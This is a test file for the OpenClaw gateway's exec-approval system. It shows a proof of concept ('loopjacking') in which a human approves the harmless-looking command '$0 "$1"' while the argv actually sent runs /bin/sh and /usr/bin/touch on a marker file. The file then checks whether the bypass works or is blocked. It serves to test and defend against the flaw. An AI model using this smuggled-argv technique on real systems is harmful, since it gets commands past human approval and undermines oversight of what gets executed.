import crypto from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawn } from "node:child_process";
import { afterAll, beforeAll, describe, expect, test } from "vitest";
import { WebSocket } from "ws";
import { formatExecCommand, resolveSystemRunCommand } from "../infra/system-run-command.js";
import { sleep } from "../utils.js";
import { GATEWAY_CLIENT_MODES, GATEWAY_CLIENT_NAMES } from "../utils/message-channel.js";
import { GatewayClient } from "./client.js";
import { handleSystemRunInvoke } from "../node-host/invoke-system-run.js";
import {
  connectReq,
  installGatewayTestHooks,
  onceMessage,
  rpcReq,
  startServerWithClient,
  trackConnectChallengeNonce,
} from "./test-helpers.js";

installGatewayTestHooks({ scope: "suite" });

const EXPECT_ATTACK = process.env.OPENCLAW_EXPECT_ATTACK === "1";
const PROBE_ROOT = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-loopjacking-"));
const ATTACK_MARKER = path.join(PROBE_ROOT, "material-b.marker");
const NODE_CONNECT_TIMEOUT_MS = 3_000;

type RpcResponse = {
  ok: boolean;
  payload?: unknown;
  error?: { code?: string; message?: string };
};

type CapturedApproval = {
  id: string;
  event: Record<string, unknown>;
  view: string;
  decision: "allow-once";
};

function runArgv(
  argv: string[],
  cwd: string | undefined,
  env: Record<string, string> | undefined,
  timeoutMs: number | undefined,
) {
  return new Promise<{
    success: boolean;
    stdout: string;
    stderr: string;
    timedOut: boolean;
    truncated: boolean;
    exitCode: number | null;
    error: string | null;
  }>((resolve) => {
    const child = spawn(argv[0]!, argv.slice(1), {
      cwd,
      env: { ...process.env, ...(env ?? {}) },
      stdio: ["ignore", "pipe", "pipe"],
    });
    let stdout = "";
    let stderr = "";
    let timedOut = false;
    const timer =
      timeoutMs && timeoutMs > 0
        ? setTimeout(() => {
            timedOut = true;
            child.kill("SIGKILL");
          }, timeoutMs)
        : null;
    child.stdout.on("data", (chunk) => {
      stdout += String(chunk);
    });
    child.stderr.on("data", (chunk) => {
      stderr += String(chunk);
    });
    child.on("error", (error) => {
      if (timer) {
        clearTimeout(timer);
      }
      resolve({
        success: false,
        stdout,
        stderr,
        timedOut,
        truncated: false,
        exitCode: null,
        error: String(error),
      });
    });
    child.on("close", (code) => {
      if (timer) {
        clearTimeout(timer);
      }
      resolve({
        success: code === 0 && !timedOut,
        stdout,
        stderr,
        timedOut,
        truncated: false,
        exitCode: code,
        error: code === 0 && !timedOut ? null : `exit ${String(code)}`,
      });
    });
  });
}

describe("OpenClaw approval binding evidence", () => {
  let server: Awaited<ReturnType<typeof startServerWithClient>>["server"] | undefined;
  let port: number;
  let node: GatewayClient | undefined;
  let nodeInvokeCount = 0;
  const executedArgv: string[][] = [];

  beforeAll(async () => {
    const started = await startServerWithClient("loopback-secret", { controlUiEnabled: true });
    server = started.server;
    port = started.port;
    started.ws.close();

    let readyResolve: (() => void) | null = null;
    const ready = new Promise<void>((resolve) => {
      readyResolve = resolve;
    });

    node = new GatewayClient({
      url: `ws://127.0.0.1:${port}`,
      connectDelayMs: 2_000,
      token: "loopback-secret",
      role: "node",
      clientName: GATEWAY_CLIENT_NAMES.NODE_HOST,
      clientVersion: "1.0.0",
      platform: "linux",
      mode: GATEWAY_CLIENT_MODES.NODE,
      scopes: [],
      commands: ["system.run"],
      onHelloOk: () => readyResolve?.(),
      onEvent: (event) => {
        if (event.event !== "node.invoke.request") {
          return;
        }
        nodeInvokeCount += 1;
        const envelope = event.payload as {
          id?: string;
          nodeId?: string;
          paramsJSON?: string;
        };
        const id = envelope.id ?? "";
        const nodeId = envelope.nodeId ?? "";
        const params = JSON.parse(envelope.paramsJSON ?? "{}") as Record<string, unknown>;
        void handleSystemRunInvoke({
          client: node!,
          params: params as never,
          skillBins: { current: async () => [] },
          execHostEnforced: false,
          execHostFallbackAllowed: true,
          resolveExecSecurity: () => "allowlist",
          resolveExecAsk: () => "always",
          isCmdExeInvocation: () => false,
          sanitizeEnv: (value) => value,
          runCommand: async (argv, cwd, env, timeoutMs) => {
            executedArgv.push([...argv]);
            return await runArgv(argv, cwd, env, timeoutMs);
          },
          runViaMacAppExecHost: async () => null,
          sendNodeEvent: async () => {},
          buildExecEventPayload: (payload) => payload,
          sendInvokeResult: async (result) => {
            await node!.request("node.invoke.result", {
              id,
              nodeId,
              ok: result.ok,
              payloadJSON: result.payloadJSON ?? null,
              error: result.error ?? null,
            });
          },
          sendExecFinishedEvent: async () => {},
          preferMacAppExecHost: false,
        }).catch(async (error) => {
          await node!.request("node.invoke.result", {
            id,
            nodeId,
            ok: false,
            error: { code: "INTERNAL", message: String(error) },
          });
        });
      },
    });
    node.start();
    await Promise.race([
      ready,
      sleep(NODE_CONNECT_TIMEOUT_MS).then(() => {
        throw new Error("timeout waiting for node connection");
      }),
    ]);
  });

  afterAll(async () => {
    node?.stop();
    if (server) {
      await server.close();
    }
    fs.rmSync(PROBE_ROOT, { recursive: true, force: true });
  });

  async function connectOperator(scopes: string[]) {
    const ws = new WebSocket(`ws://127.0.0.1:${port}`);
    trackConnectChallengeNonce(ws);
    await new Promise<void>((resolve) => ws.once("open", resolve));
    const response = await connectReq(ws, {
      token: "loopback-secret",
      scopes,
      timeoutMs: 2_000,
    });
    expect(response.ok).toBe(true);
    return ws;
  }

  async function connectedNodeId(ws: WebSocket) {
    const response = await rpcReq<{ nodes?: Array<{ nodeId: string; connected?: boolean }> }>(
      ws,
      "node.list",
      {},
    );
    expect(response.ok).toBe(true);
    const nodeId = response.payload?.nodes?.find((entry) => entry.connected)?.nodeId ?? "";
    expect(nodeId).not.toBe("");
    return nodeId;
  }

  async function approveExactView(
    wsApprover: WebSocket,
    nodeId: string,
    view: string,
  ): Promise<CapturedApproval> {
    const id = crypto.randomUUID();
    const eventPromise = onceMessage<{
      type?: string;
      event?: string;
      payload?: Record<string, unknown> | null;
    }>(
      wsApprover,
      (message) =>
        message.type === "event" &&
        message.event === "exec.approval.requested" &&
        (message.payload as { id?: string } | null)?.id === id,
    );
    const requestPromise = rpcReq(wsApprover, "exec.approval.request", {
      id,
      command: view,
      nodeId,
      cwd: null,
      host: "node",
      timeoutMs: 30_000,
    });
    const event = await eventPromise;
    const payload = (event.payload ?? {}) as Record<string, unknown>;
    const request = (payload.request ?? {}) as Record<string, unknown>;
    expect(request.command).toBe(view);

    const resolved = await rpcReq(wsApprover, "exec.approval.resolve", {
      id,
      decision: "allow-once",
    });
    expect(resolved.ok).toBe(true);
    const requested = await requestPromise;
    expect(requested.ok).toBe(true);
    return { id, event: payload, view, decision: "allow-once" };
  }

  test("records exact approval, direct-B, unchanged-A, and affected/fixed outcomes", async () => {
    const wsApprover = await connectOperator(["operator.write", "operator.approvals"]);
    const wsCaller = await connectOperator(["operator.write"]);
    try {
      const nodeId = await connectedNodeId(wsApprover);
      const visibleA = '$0 "$1"';
      const hiddenArgv = ["/bin/sh", "-lc", visibleA, "/usr/bin/touch", ATTACK_MARKER];
      const canonicalB = formatExecCommand(hiddenArgv);
      const resolver = resolveSystemRunCommand({ command: hiddenArgv, rawCommand: visibleA });
      const derivedWithoutRaw = resolveSystemRunCommand({ command: hiddenArgv });

      const directStartCount = nodeInvokeCount;
      const directB = (await rpcReq(wsCaller, "node.invoke", {
        nodeId,
        command: "system.run",
        params: {
          command: hiddenArgv,
        },
        idempotencyKey: crypto.randomUUID(),
      })) as RpcResponse;
      const directMarker = fs.existsSync(ATTACK_MARKER);
      const directReachedNode = nodeInvokeCount === directStartCount + 1;
      expect(directB.ok).toBe(false);
      expect(directMarker).toBe(false);
      expect(nodeInvokeCount).toBe(directStartCount + 1);

      const unchangedArgv = ["/usr/bin/printf", "UNCHANGED_A"];
      const unchangedView = formatExecCommand(unchangedArgv);
      const unchangedApproval = await approveExactView(wsApprover, nodeId, unchangedView);
      const unchanged = (await rpcReq(wsCaller, "node.invoke", {
        nodeId,
        command: "system.run",
        params: {
          command: unchangedArgv,
          rawCommand: unchangedView,
          runId: unchangedApproval.id,
          approved: true,
          approvalDecision: "allow-once",
        },
        idempotencyKey: crypto.randomUUID(),
      })) as RpcResponse;
      expect(unchanged.ok, JSON.stringify(unchanged)).toBe(true);

      const attackApproval = await approveExactView(wsApprover, nodeId, visibleA);
      const attackStartCount = nodeInvokeCount;
      const attack = (await rpcReq(wsCaller, "node.invoke", {
        nodeId,
        command: "system.run",
        params: {
          command: hiddenArgv,
          rawCommand: visibleA,
          runId: attackApproval.id,
          approved: true,
          approvalDecision: "allow-once",
        },
        idempotencyKey: crypto.randomUUID(),
      })) as RpcResponse;
      const markerAfterAttack = fs.existsSync(ATTACK_MARKER);

      if (EXPECT_ATTACK) {
        expect(resolver.ok).toBe(true);
        expect(attack.ok).toBe(true);
        expect(nodeInvokeCount).toBe(attackStartCount + 1);
        expect(markerAfterAttack).toBe(true);
      } else {
        expect(resolver.ok).toBe(false);
        expect(attack.ok).toBe(false);
        expect(nodeInvokeCount).toBe(attackStartCount);
        expect(markerAfterAttack).toBe(false);
      }

      console.log(
        "OPENCLAW_LOOPJACKING_RESULT=" +
          JSON.stringify({
            packageVersion: JSON.parse(fs.readFileSync(path.join(process.cwd(), "package.json"), "utf8"))
              .version,
            expectedAttack: EXPECT_ATTACK,
            exactApprovalView: attackApproval.event,
            humanDecision: {
              decision: attackApproval.decision,
              understoodA: attackApproval.view,
              forged: false,
              resolvedThrough: "exec.approval.resolve",
            },
            completeUnderlyingRequest: {
              command: hiddenArgv,
              rawCommand: visibleA,
              canonicalOperationB: canonicalB,
              preparedBeforeApproval: true,
            },
            productResolutionWithRawA: resolver,
            productDerivedApprovalTextWithoutRaw: derivedWithoutRaw,
            attack: {
              rpcOk: attack.ok,
              error: attack.error ?? null,
              reachedNode: nodeInvokeCount === attackStartCount + 1,
              markerCreated: markerAfterAttack,
            },
            controls: {
              directB: {
                rpcOk: directB.ok,
                error: directB.error ?? null,
                reachedNode: directReachedNode,
                markerCreated: directMarker,
              },
              unchangedA: {
                exactApprovalView: unchangedApproval.event,
                rpcOk: unchanged.ok,
                error: unchanged.error ?? null,
              },
            },
            executedArgv,
          }),
      );
    } finally {
      wsApprover.close();
      wsCaller.close();
    }
  }, 30_000);
});
